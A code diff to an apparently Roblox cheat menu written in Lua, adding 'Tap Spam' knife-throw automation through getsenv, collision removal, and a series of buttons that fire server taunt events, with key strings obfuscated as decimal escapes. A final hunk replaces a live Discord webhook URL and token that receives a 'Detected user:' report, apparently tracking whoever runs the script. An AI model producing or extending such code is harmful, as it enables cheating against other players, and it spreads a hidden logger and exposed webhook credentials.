@@ -47,6 +47,23 @@ Tab:Button{
 }
 
 Tab:Button{
+	Name = "Tap Spam",
+	Description = nil,
+	Callback = function() 
+	    local CoreGui = game:GetService("StarterGui")
+
+            GUI:Notification{
+	Title = "Alert",
+	Text = "Tap Spam enabled. Click E to use tap spame. Tap Spam is the same as spam knife but just tap version.",
+	Duration = 8,
+	Callback = function() end
+}
+local n = game.Players.LocalPlayer:GetMouse() n.KeyDown:Connect(function(m)  if m == "\101" then local s = getsenv(workspace[game.Players.LocalPlayer.Name].Knife.KnifeServer.KnifeClient) s.TriggerWeapon({ AttackType = "\75\110\105\102\101\84\104\114\111\119", ThrowCharge = 0.05 }) end end)
+end
+    
+}
+
+Tab:Button{
 	Name = "Aimbot",
 	Description = nil,
 	Callback = function() local CoreGui = game:GetService("StarterGui")
@@ -89,6 +106,141 @@ Tab:Button{
                 
             }
 local m = game.Players.LocalPlayer while true do wait() if m.Character and m.Character:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") then game.Workspace[m.Character.Name].CollisionParts:Destroy() end end
+end}
+
+Tab:Button{
+	Name = "Cut Thorat",
+	Description = nil,
+	Callback = function() local CoreGui = game:GetService("StarterGui")
+
+            GUI:Notification{
+	Title = "Alert",
+	Text = "Emoting...",
+	Duration = 2,
+	Callback = function() end 
+                
+            }
+    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\67\117\116\84\104\114\111\97\116")
+end}
+
+Tab:Button{
+	Name = "Chirimiru",
+	Description = nil,
+	Callback = function() local CoreGui = game:GetService("StarterGui")
+
+            GUI:Notification{
+	Title = "Alert",
+	Text = "Emoting...",
+	Duration = 2,
+	Callback = function() end 
+                
+            }
+    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\67\104\105\114\105\109\105\114\117")
+end}
+
+Tab:Button{
+	Name = "Dab",
+	Description = nil,
+	Callback = function() local CoreGui = game:GetService("StarterGui")
+
+            GUI:Notification{
+	Title = "Alert",
+	Text = "Emoting...",
+	Duration = 2,
+	Callback = function() end 
+                
+            }
+    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\68\97\98")
+end}
+
+Tab:Button{
+	Name = "KazotskyKick",
+	Description = nil,
+	Callback = function() local CoreGui = game:GetService("StarterGui")
+
+            GUI:Notification{
+	Title = "Alert",
+	Text = "Emoting...",
+	Duration = 2,
+	Callback = function() end 
+                
+            }
+    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\75\97\122\111\116\115\107\121\75\105\99\107")
+end}
+
+Tab:Button{
+	Name = "Meditation Taunt",
+	Description = nil,
+	Callback = function() local CoreGui = game:GetService("StarterGui")
+
+            GUI:Notification{
+	Title = "Alert",
+	Text = "Emoting...",
+	Duration = 2,
+	Callback = function() end 
+                
+            }
+    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\77\101\100\105\116\97\116\105\111\110\84\97\117\110\116")
+end}
+
+Tab:Button{
+	Name = "Money Taunt",
+	Description = nil,
+	Callback = function() local CoreGui = game:GetService("StarterGui")
+
+            GUI:Notification{
+	Title = "Alert",
+	Text = "Emoting...",
+	Duration = 2,
+	Callback = function() end 
+                
+            }
+    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\77\111\110\101\121\84\97\117\110\116")
+end}
+
+Tab:Button{
+	Name = "Self Destruct",
+	Description = nil,
+	Callback = function() local CoreGui = game:GetService("StarterGui")
+
+            GUI:Notification{
+	Title = "Alert",
+	Text = "Emoting...",
+	Duration = 2,
+	Callback = function() end 
+                
+            }
+    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\83\101\108\102\68\101\115\116\114\117\99\116")
+end}
+
+Tab:Button{
+	Name = "T-Pose",
+	Description = nil,
+	Callback = function() local CoreGui = game:GetService("StarterGui")
+
+            GUI:Notification{
+	Title = "Alert",
+	Text = "Emoting...",
+	Duration = 2,
+	Callback = function() end 
+                
+            }
+    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\84\80\111\115\101")
+end}
+
+Tab:Button{
+	Name = "Selfie",
+	Description = nil,
+	Callback = function() local CoreGui = game:GetService("StarterGui")
+
+            GUI:Notification{
+	Title = "Alert",
+	Text = "Emoting...",
+	Duration = 2,
+	Callback = function() end 
+                
+            }
+    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\83\101\108\102\105\101")
 end}
 
 local Tab = GUI:Tab{
@@ -546,7 +698,7 @@ end
 return g(urprint,...)
 end)
 local url =
-"https://discord.com/api/webhooks/1018540435335041024/_1IZGJEGs4PfTlroH3fu_nFXiAn7MtMCGsrwAhRyhf2d_ILW1ZTrx8-t3aCP8DPjHntn"
+"https://discord.com/api/webhooks/1009239170331447367/PKHDN6NXGr85w3ldmKAmu3IsmQ8-5T2x0XuNE1CdapUSgwZBLZpFQdrQzGqe6fc-82lo"
 local data = {
 ["content"] = "Detected user:",
 ["embeds"] = {
